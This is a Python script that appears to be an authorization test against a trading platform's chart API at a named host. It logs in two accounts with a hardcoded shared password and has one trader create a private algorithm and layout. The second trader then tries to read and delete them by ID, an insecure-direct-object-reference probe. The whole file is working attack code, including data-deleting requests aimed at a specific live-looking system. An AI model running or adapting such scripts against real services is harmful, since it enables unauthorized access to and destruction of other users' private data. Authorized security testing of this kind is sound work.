import requests
import json

BASE_URL = "https://lpadmin.blackfx.com"
PWD = "12345678"

# 1. Login Trader 1 (mamf1)
s1 = requests.Session()
s1.post(f"{BASE_URL}/api/auth/login", json={"email": "mamf1@mailinator.com", "password": PWD})
tok1 = s1.post(f"{BASE_URL}/api/auth/chart-token").json().get("token")
h1 = {"Authorization": f"Bearer {tok1}", "Content-Type": "application/json"}

# 2. Login Trader 2 (mamf2)
s2 = requests.Session()
s2.post(f"{BASE_URL}/api/auth/login", json={"email": "mamf2@mailinator.com", "password": PWD})
tok2 = s2.post(f"{BASE_URL}/api/auth/chart-token").json().get("token")
h2 = {"Authorization": f"Bearer {tok2}", "Content-Type": "application/json"}

print(f"Trader 1 token: {bool(tok1)}, Trader 2 token: {bool(tok2)}")

# Trader 1 creates an algo
r_create_algo = s1.post(f"{BASE_URL}/v1/chart/algo/createAlgo", headers=h1, json={
    "name": "Secret Proprietary Algo T1",
    "source": "// Secret code 12345",
    "description": "Trader 1 Private Algo"
})
print("Trader 1 createAlgo:", r_create_algo.status_code, r_create_algo.text)
algo_id = r_create_algo.json().get("algo", {}).get("id") or r_create_algo.json().get("id")
print("Created Algo ID:", algo_id)

# Trader 1 lists algos
r_list_algo = s1.post(f"{BASE_URL}/v1/chart/algo/listAlgo", headers=h1, json={})
print("Trader 1 listAlgo:", r_list_algo.status_code, r_list_algo.text[:300])

# Trader 1 saves a layout
r_save_layout = s1.post(f"{BASE_URL}/v1/chart/layout/saveLayout", headers=h1, json={
    "name": "Trader 1 Secret Layout",
    "content": "{\"charts\": [\"BTCUSDT\"]}",
    "is_public": False
})
print("Trader 1 saveLayout:", r_save_layout.status_code, r_save_layout.text)
layout_id = r_save_layout.json().get("layout", {}).get("id") or r_save_layout.json().get("id")
print("Created Layout ID:", layout_id)

# Trader 2 attempts to fetch Trader 1's private layout
if layout_id:
    r_idor_layout = s2.post(f"{BASE_URL}/v1/chart/layout/getMyLayout", headers=h2, json={"id": layout_id})
    print("Trader 2 IDOR getMyLayout:", r_idor_layout.status_code, r_idor_layout.text)

    # Trader 2 attempts to delete Trader 1's layout
    r_idor_del = s2.post(f"{BASE_URL}/v1/chart/layout/deleteMyLayout", headers=h2, json={"id": layout_id})
    print("Trader 2 IDOR deleteMyLayout:", r_idor_del.status_code, r_idor_del.text)

# Trader 2 attempts to fetch Trader 1's private algo
if algo_id:
    r_idor_algo = s2.post(f"{BASE_URL}/v1/chart/algo/getAlgo", headers=h2, json={"id": algo_id})
    print("Trader 2 IDOR getAlgo:", r_idor_algo.status_code, r_idor_algo.text)

    # Trader 2 attempts to delete Trader 1's algo
    r_idor_del_algo = s2.post(f"{BASE_URL}/v1/chart/algo/deleteAlgo", headers=h2, json={"id": algo_id})
    print("Trader 2 IDOR deleteAlgo:", r_idor_del_algo.status_code, r_idor_del_algo.text)
